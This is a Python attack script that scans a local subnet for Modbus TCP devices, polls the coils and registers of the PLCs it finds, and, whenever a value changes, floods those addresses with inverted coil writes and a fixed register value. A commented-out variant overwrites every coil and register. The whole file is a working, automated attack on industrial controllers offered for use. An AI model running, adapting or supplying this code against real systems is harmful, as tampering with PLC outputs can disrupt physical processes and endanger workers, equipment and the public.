#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# 啟動命令: sudo python3 auto_modbus_tcp_attack.py 192.168.3.0/24
# 使用多執行續原因是 如果多台設備時可以同時攻擊
import threading
from wsgiref.handlers import format_date_time
import nmap3
import sys
import json
import time
from pyModbusTCP.client import ModbusClient
import datetime
from attack_log.write_log_txt import write_log
import copy
from collections import Counter #計算攻擊次數

scan_start_time_interval=2 #每隔2分鐘
scan_time_sleep_second=0.05
attack_number=20
attack_time_sleep_second=0.01
all_plc_state=[]
attack_all_plc_state_information=[]


write_log_object=write_log()
write_log_object.delete_old_log_file()
write_log_object.write_log_txt('------------')

def spilt_sub_ip_name_string(message):
    value=message.rsplit('.',1)
    return value


def modbus_tcp_is_connected(ip_address,ports):
    modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    temp=modbus_tcp_client.read_coils(1)
    # if modbus_tcp_client.is_open():
    if temp != None:
        tempp={}
        tempp['ip']=ip_address
        tempp['port']=[]
        tempp['port'].append(ports)
        # tempp.append(ip_address)
        # tempp.append(ports)
        modbus_tcp_client.close()
        return tempp
    else:
        return None

    
def modbus_tcp_scan_PLC_state(ip_address,ports):
    global all_plc_state
    list_id=0
    for i in range(len(all_plc_state)):
        if all_plc_state[i]['ip']==ip_address:
            list_id=i
    modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    try:
        PLC_state_list=[]
        PLC_coils_state_list=[]
        PLC_auxiliary_relay_state_list=[]
        PLC_data_register_state_list=[]
        print('modbus_tcp_scan_PLC_state_1_start')
        for i in range(1024):
            PLC_coils_state_list.append(modbus_tcp_client.read_coils(i))
            # time.sleep(scan_time_sleep_second)
        for i in range(8192,9000):
            PLC_auxiliary_relay_state_list.append(modbus_tcp_client.read_coils(i))
            # time.sleep(scan_time_sleep_second)
        for i in range(0,1000):
            PLC_data_register_state_list.append(modbus_tcp_client.read_holding_registers(i))
            # time.sleep(scan_time_sleep_second)
        PLC_state_list.append(PLC_coils_state_list)
        PLC_state_list.append(PLC_auxiliary_relay_state_list)
        PLC_state_list.append(PLC_data_register_state_list)
        all_plc_state[list_id]['PLC_State']=PLC_state_list
        # write_log_object.write_log_txt('t_now_time.minute['+str(list_id)+']='+str(t_now_time.minute))
        # write_log_object.write_log_txt('thread['+str(list_id)+']='+str(all_plc_state[list_id]))
        print('modbus_tcp_scan_PLC_state_1_stop')
        modbus_tcp_client.close()
    except KeyboardInterrupt:
        modbus_tcp_client.close()


def modbus_tcp_scan_PLC_state_2(ip_address,ports):
    global all_plc_state
    list_id=0
    for i in range(len(all_plc_state)):
        if all_plc_state[i]['ip']==ip_address:
            list_id=i
    while True:
        try:
            modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
            t_now_time=datetime.datetime.now()
            if t_now_time.minute%scan_start_time_interval==0 and t_now_time.second==0:
                time.sleep(1)
                PLC_state_list=[]
                PLC_coils_state_list=[]
                PLC_auxiliary_relay_state_list=[]
                PLC_data_register_state_list=[]
                print('modbus_tcp_scan_PLC_state_2_start')
                for i in range(1024):
                    PLC_coils_state_list.append(modbus_tcp_client.read_coils(i))
                    # time.sleep(scan_time_sleep_second)
                for i in range(8192,9000):
                    PLC_auxiliary_relay_state_list.append(modbus_tcp_client.read_coils(i))
                    # time.sleep(scan_time_sleep_second)
                for i in range(0,1000):
                    PLC_data_register_state_list.append(modbus_tcp_client.read_holding_registers(i))
                    # time.sleep(scan_time_sleep_second)
                PLC_state_list.append(PLC_coils_state_list)
                PLC_state_list.append(PLC_auxiliary_relay_state_list)
                PLC_state_list.append(PLC_data_register_state_list)
                all_plc_state[list_id]['PLC_State']=PLC_state_list
                print('modbus_tcp_scan_PLC_state_2_stop')
                # write_log_object.write_log_txt('t_now_time.minute['+str(list_id)+']='+str(t_now_time.minute))
                # write_log_object.write_log_txt('thread2['+str(list_id)+']='+str(all_plc_state[list_id]))
            modbus_tcp_client.close()
        except KeyboardInterrupt:
            modbus_tcp_client.close()

# def modbus_tcp_attack_function(ip_address,ports):
#     modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
#     try:
#         #write Coil 線圈
#         print('-----attack PLC write Coil -----')
#         for i in range(1024):
#             for j in range(19):
#                 modbus_tcp_client.write_single_coil(i,True)
#                 time.sleep(0.001)
#             print('Read Coil  '+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
#             time.sleep(0.001)
#         # modbus_tcp_client.close()
#         time.sleep(10)
#         #write M0 線圈暫存器
#         print('-----attack PLC write M0 (Auxiliary relay) -----')
#         for i in range(8192,15872):
#             for j in range(19):
#                 modbus_tcp_client.write_single_coil(i,True)
#                 time.sleep(0.001)
#             print('Read M'+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
#             time.sleep(0.001)
#         # modbus_tcp_client.close()
#         #write D0 數據暫存器
#         print('-----attack PLC write D0 (Data register) -----')
#         # D_attack_Inform=['5376']
#         for i in range(0,8000):
#             for j in range(19):
#                 modbus_tcp_client.write_single_register(i,5376) #5376 = 我生氣了
#                 time.sleep(0.001)
#             print('Read D'+str(i)+' is='+str(modbus_tcp_client.read_holding_registers(i)))
#             time.sleep(0.001)
#         modbus_tcp_client.close()
#     except KeyboardInterrupt:
#         modbus_tcp_client.close()

def modbus_tcp_plc_state_is_change(list1,list2):
    tt_temp=[]
    for i in range(len(list1)):
        # print('i='+str(i))
        t_temp={}
        t_temp['ip']=list1[i]['ip']
        t_temp['port']=list1[i]['port']
        t_temp['PLC_State_is_change_address']=[]
        t_temp['PLC_State']=[]
        for j in range(len(list1[i]['PLC_State'])):#0~2
            t_temppp=[]
            t_temppp_2=[]
            if j==1: # auxiliary_relay
                t_len=len(list1[i]['PLC_State'][j])
                for k in range(t_len): # 0~1024 and 0~8000 (coils,data_register)
                    if list1[i]['PLC_State'][j][k]!=list2[i]['PLC_State'][j][k]:
                        t_temppp.append(k+8192)
                        t_temppp_2.append(list2[i]['PLC_State'][j][k])
                t_temp['PLC_State_is_change_address'].append(t_temppp)
                t_temp['PLC_State'].append(t_temppp_2)
            else:  # 0~1024 and 0~8000 (coils,data_register)
                for k in range(len(list1[i]['PLC_State'][j])):
                    if list1[i]['PLC_State'][j][k]!=list2[i]['PLC_State'][j][k]:
                        t_temppp.append(k)
                        t_temppp_2.append(list2[i]['PLC_State'][j][k])
                t_temp['PLC_State_is_change_address'].append(t_temppp)
                t_temp['PLC_State'].append(t_temppp_2)
        tt_temp.append(t_temp)
        # write_log_object.write_log_txt('tt_temp='+str(tt_temp))
    return tt_temp

def modbus_tcp_attack_function(list,list_id):
    write_log_object.write_log_txt('modbus_tcp_attack_function_id='+str(list_id))
    global attack_all_plc_state_information
    attack_all_plc_state_information=copy.deepcopy(list)
    attack_all_plc_state_information[list_id]['replay_state']=[]
    modbus_tcp_client = ModbusClient(attack_all_plc_state_information[list_id]['ip'],attack_all_plc_state_information[list_id]['port'][0],auto_open=True) #UID 可能可以不用設
    try:
        #write Coil 線圈
        print('-----attack PLC write Coil -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][0][i]==True:
                        response_1=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0][i],False)
                    else:
                        response_1=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0][i],True)
                    time.sleep(attack_time_sleep_second)
                    t_temp.append(response_1)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
            # modbus_tcp_client.close()
        #write M0 線圈暫存器
        print('-----attack PLC write M0 (Auxiliary relay) -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][1][i]==True:
                        response_2=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1][i],False)
                    else:
                        response_2=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1][i],True)
                    time.sleep(attack_time_sleep_second)
                    t_temp.append(response_2)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
            # modbus_tcp_client.close()
        #write D0 數據暫存器
        print('-----attack PLC write D0 (Data register) -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][2][i]:
                       response_3=modbus_tcp_client.write_single_register(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2][i],5376) #5376 = 我生氣了 # D_attack_Inform=['5376']
                    time.sleep(attack_time_sleep_second)
                    t_temp.append(response_3)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
        modbus_tcp_client.close()
    except KeyboardInterrupt:
        modbus_tcp_client.close()            
print('------')

#---- scan host open port------#
ip_range=sys.argv[1]
sub_ip=spilt_sub_ip_name_string(str(ip_range))
sub_ip=sub_ip[0]+'.'
computer_information=[]
nmapp=nmap3.NmapHostDiscovery()
for i in range(39,51): #掃描ip數量
    scan_ip_address=sub_ip+str(i)
    print('ip='+scan_ip_address)
    results = nmapp.nmap_portscan_only(scan_ip_address)
    if len(results)>2: #有找到機器開機並開幾服務(port)
        data={}
        data['ip']=scan_ip_address
        data['port']=[]
        port_len=len(results[scan_ip_address]['ports'])
        for j in range(port_len):
            port_number=results[scan_ip_address]['ports'][j]['portid']
            data['port'].append(port_number)
        # 怕有些機器開啟不會回應502 port
        data['port'].append(502)
        computer_information.append(data)
        print('-----------------------')
print('computer_information='+str(computer_information))
write_log_object.write_log_txt('step1='+str(computer_information))
write_log_object.write_log_txt('****************')
#------computer_information to json------
# jjson_str=json.dumps(computer_information)
# print('jjson_str='+str(jjson_str))

tempp=[]
for i in range(len(computer_information)):
    for j in range(len(computer_information[i]['port'])):
        temp=modbus_tcp_is_connected(computer_information[i]['ip'],computer_information[i]['port'][j])
        if temp !=None:
            tempp.append(temp)
computer_information=tempp
print("computer_information="+str(computer_information))
write_log_object.write_log_txt('step2='+str(computer_information))
write_log_object.write_log_txt('****************')
all_plc_state=computer_information
scan_threads=[]
scan_threads2=[]
try:
    for i in range(len(all_plc_state)):
        for j in range(len(all_plc_state[i]['port'])):
            thread=threading.Thread(target=modbus_tcp_scan_PLC_state,args=(all_plc_state[i]['ip'],all_plc_state[i]['port'][j],))
            scan_threads.append(thread)
            thread.start()
    
    for thread in scan_threads:  # iterates over the threads
        thread.join()       # waits until the thread has finished work
    print('scan_thread_1_is_ok')
    for i in range(len(all_plc_state)):
        for j in range(len(all_plc_state[i]['port'])):
            thread=threading.Thread(target=modbus_tcp_scan_PLC_state_2,args=(all_plc_state[i]['ip'],all_plc_state[i]['port'][j],))
            scan_threads2.append(thread)
            thread.start()
    print('scan_thread_2_is_run')
    time.sleep(scan_start_time_interval) #先等待所有掃描回來
    old_all_plc_state=copy.deepcopy(all_plc_state) #指複製東西，不會跟著全域一起變動
    state_is_change=[]
    old_time=datetime.datetime.now()
    print('old_all_plc_state[0][PLC_State][1][0]'+str(old_all_plc_state[0]['PLC_State'][1][0]))
    print('old_time='+str(old_time.minute))
    while True:
        now_time=datetime.datetime.now()
        if now_time.minute%scan_start_time_interval==0 and now_time.second==0:
            time.sleep(1)
            print('old_now_time='+str(now_time.minute))
            print('old_all_plc_state[0][PLC_State][1][0]'+str(old_all_plc_state[0]['PLC_State'][1][0]))
            print('all_plc_state[0][PLC_State][1][0]'+str(all_plc_state[0]['PLC_State'][1][0]))
            write_log_object.write_log_txt('now_time='+str(now_time.minute))
            write_log_object.write_log_txt('old_all_plc_state[0][PLC_State][0][2]'+str(old_all_plc_state[0]['PLC_State'][1][0]))
            write_log_object.write_log_txt('all_plc_state[0][PLC_State][0][2]'+str(all_plc_state[0]['PLC_State'][1][0]))
            write_log_object.write_log_txt('--------------')
            if old_all_plc_state!=all_plc_state:
                print('now_now_time='+str(now_time.minute))
                state_is_change=modbus_tcp_plc_state_is_change(old_all_plc_state,all_plc_state)
                write_log_object.write_log_txt('now_time='+str(now_time.minute))
                write_log_object.write_log_txt('state_is_change'+str(state_is_change))
                print('state_is_change'+str(state_is_change))
                old_all_plc_state=copy.deepcopy(all_plc_state) #指複製東西，不會跟著全域一起變動
                attack_thread_list=[]
                for i in range(len(state_is_change)):
                    thread=threading.Thread(target=modbus_tcp_attack_function,args=(state_is_change,i,))
                    attack_thread_list.append(thread)
                    thread.start()
                for thread in attack_thread_list:  # iterates over the threads
                    thread.join()       # waits until the thread has finished work
                print('attack_all_plc_state_information='+str(attack_all_plc_state_information))
                write_log_object.write_log_txt('attack_all_plc_state_information='+str(attack_all_plc_state_information))


    # while True:
    #     print('all_plc_state='+str(all_plc_state))
    #     write_log_object.write_log_txt('all_plc_state[0]='+str(all_plc_state[0]))
    #     write_log_object.write_log_txt('all_plc_state[1]='+str(all_plc_state[1]))
    #     write_log_object.write_log_txt('---------------------------------')
    # for thread in threads:  # iterates over the threads
    #     thread.join()       # waits until the thread has finished work

except KeyboardInterrupt:
    for i in range(len(scan_threads)):
        scan_threads[i].kill()